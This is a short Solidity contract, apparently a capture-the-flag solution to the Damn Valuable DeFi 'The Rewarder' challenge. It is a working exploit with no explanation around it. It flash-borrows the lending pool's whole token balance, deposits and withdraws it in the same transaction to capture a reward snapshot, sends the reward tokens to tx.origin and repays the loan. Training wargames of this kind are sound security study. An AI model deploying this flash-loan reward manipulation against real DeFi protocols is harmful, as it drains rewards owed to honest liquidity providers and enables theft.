// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract RektTheRewarder {
    FlashLoanerPool public immutable flashLoanerPool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewardPool;
    RewardToken public immutable rewardToken;

    constructor(
        address flashLoanerPoolAddress,
        address liquidityTokenAddress,
        address rewardPoolAddress,
        address rewardTokenAddress
    ) {
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardPool = TheRewarderPool(rewardPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function rekt() external {
        uint256 amount = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        rewardToken.transfer(tx.origin, rewardToken.balanceOf(address(this)));
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
